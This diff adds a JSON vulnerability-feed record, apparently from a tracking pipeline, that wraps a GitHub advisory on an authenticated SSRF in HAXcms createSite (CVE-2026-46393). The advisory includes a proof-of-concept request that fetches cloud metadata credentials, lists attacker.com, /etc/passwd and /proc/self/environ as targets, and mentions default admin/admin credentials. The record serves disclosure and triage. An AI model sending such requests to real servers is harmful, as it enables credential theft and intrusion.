@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"coordinator\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/215518658?v=4\", \"events_url\": \"https://api.github.com/users/wsparks-vc/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/wsparks-vc/followers\", \"following_url\": \"https://api.github.com/users/wsparks-vc/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/wsparks-vc/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/wsparks-vc\", \"id\": 215518658, \"login\": \"wsparks-vc\", \"node_id\": \"U_kgDODNiNwg\", \"organizations_url\": \"https://api.github.com/users/wsparks-vc/orgs\", \"received_events_url\": \"https://api.github.com/users/wsparks-vc/received_events\", \"repos_url\": \"https://api.github.com/users/wsparks-vc/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/wsparks-vc/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/wsparks-vc/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/wsparks-vc\", \"user_view_type\": \"public\"}}, {\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/163497830?v=4\", \"events_url\": \"https://api.github.com/users/d6fault/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/d6fault/followers\", \"following_url\": \"https://api.github.com/users/d6fault/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/d6fault/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/d6fault\", \"id\": 163497830, \"login\": \"d6fault\", \"node_id\": \"U_kgDOCb7HZg\", \"organizations_url\": \"https://api.github.com/users/d6fault/orgs\", \"received_events_url\": \"https://api.github.com/users/d6fault/received_events\", \"repos_url\": \"https://api.github.com/users/d6fault/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/d6fault/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/d6fault/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/d6fault\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-46393\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 7.1, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"### Summary  \\nAn authenticated Server-Side Request Forgery (SSRF) vulnerability in HAXcms allows users to fetch arbitrary internal or local resources and write the responses to a web-accessible directory, enabling arbitrary file read and internal network access.\\n\\n### Details  \\nThe `createSite` endpoint in HAXcms (v11.0.6) accepts a `build.files` parameter that allows an authenticated user to supply arbitrary URLs or local file paths. This input is processed without validation and ultimately fetched server-side using `file_get_contents()`.\\n\\nThe data flow is as follows:\\n- User input (`build.files`) is processed via `object_to_array()` into a PHP array  \\n- Assigned to `$filesToDownload` in `Operations.php` (line 2626)  \\n- Iterated over in `Operations.php` (line 2730), where each entry is passed to `HAXCMSFile::save()` with bulk-import enabled  \\n\\nIn `HAXCMSFile.php` (line 30), the following occurs:\\n```php\\nfile_get_contents($upload['tmp_name']);\\n```\\n\\nHere, tmp_name is attacker-controlled and may contain:\\n\\n- External URLs (`http://attacker.com`)\\n- Internal services (`http://127.0.0.1`)\\n- Cloud metadata endpoints (`http://169.254.169.254`)\\n- Local file paths (`/etc/passwd`, `/proc/self/environ`)\\n\\nThe bulk-import flag bypasses `is_uploaded_file()` validation, which normally ensures the file originates from a legitimate upload. The only restriction is an extension whitelist based on the filename (array key), which is fully attacker-controlled.\\n\\nThere are no restrictions on:\\n\\n- URL schemes (`http`, `file`, `gopher`, etc.)\\n- Destination IP ranges (internal, loopback, metadata services)\\n- Response content\\n\\nAll fetched content is written to:\\n```\\nsites/<sitename>/files/<filename>\\n```\\nand is accessible via the web.\\n\\n### PoC\\nPrerequisites:\\n\\n- Authenticated session (default credentials: `admin/admin` on fresh installs)\\n- Valid JWT and CSRF token\\n\\nStep 1: Log in and capture JWT + CSRF token\\n\\nStep 2: Send crafted request:\\n```\\nPOST /createSite HTTP/1.1\\nHost: target\\nAuthorization: Bearer [JWT]\\nX-CSRF-Token: [TOKEN]\\nContent-Type: application/json\\n\\n{\\n  \\\"site\\\": {\\n    \\\"name\\\": \\\"poc\\\"\\n  },\\n  \\\"build\\\": {\\n    \\\"files\\\": {\\n      \\\"poc.txt\\\": {\\n        \\\"tmp_name\\\": \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\"\\n      }\\n    }\\n  }\\n}\\n```\\n\\nStep 3: Retrieve response:\\n```\\nGET /sites/poc/files/poc.txt\\n```\\n\\nThe response will contain the fetched content (e.g., cloud credentials or internal service data).\\n\\n### Impact\\n\\n- SSRF enabling access to internal network services\\n- Arbitrary file read via local filesystem paths\\n- Cloud credential exposure through metadata endpoints\\n- Data exfiltration via web-accessible file storage\\n\\nAny authenticated user can exploit this to access sensitive server or infrastructure data, potentially leading to full system or cloud environment compromise.\", \"epss\": {\"percentage\": 0.00238, \"percentile\": 0.14591}, \"ghsa_id\": \"GHSA-q862-gcgq-5m6g\", \"github_reviewed_at\": \"2026-05-19T14:44:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-q862-gcgq-5m6g\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-q862-gcgq-5m6g\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-46393\"}], \"nvd_published_at\": \"2026-06-05T19:16:33Z\", \"published_at\": \"2026-05-19T14:44:20Z\", \"references\": [\"https://github.com/haxtheweb/issues/security/advisories/GHSA-q862-gcgq-5m6g\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-46393\", \"https://github.com/advisories/GHSA-q862-gcgq-5m6g\"], \"repository_advisory_url\": \"https://api.github.com/repos/haxtheweb/issues/security-advisories/GHSA-q862-gcgq-5m6g\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/haxtheweb/issues\", \"summary\": \"HAXcms createSite SSRF Enables Arbitrary File Read\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-09T11:56:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-q862-gcgq-5m6g\", \"vulnerabilities\": [{\"first_patched_version\": \"26.0.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@haxtheweb/haxcms-nodejs\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 25.0.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-q862-gcgq-5m6g",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@haxtheweb/haxcms-nodejs: <= 25.0.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-46393"
+    ],
+    "cvss_score": 7.1,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@haxtheweb/haxcms-nodejs"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.510219Z",
+  "provenance": {
+    "content_sha256": "8bf850c2dfb6ef9b41d543b7a109d0d15d02bae0df16b46be7b2011ac68df58d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-19T14:44:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-q862-gcgq-5m6g",
+  "status": "active",
+  "title": "HAXcms createSite SSRF Enables Arbitrary File Read",
+  "updated_at": "2026-06-09T11:56:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-q862-gcgq-5m6g"
+}
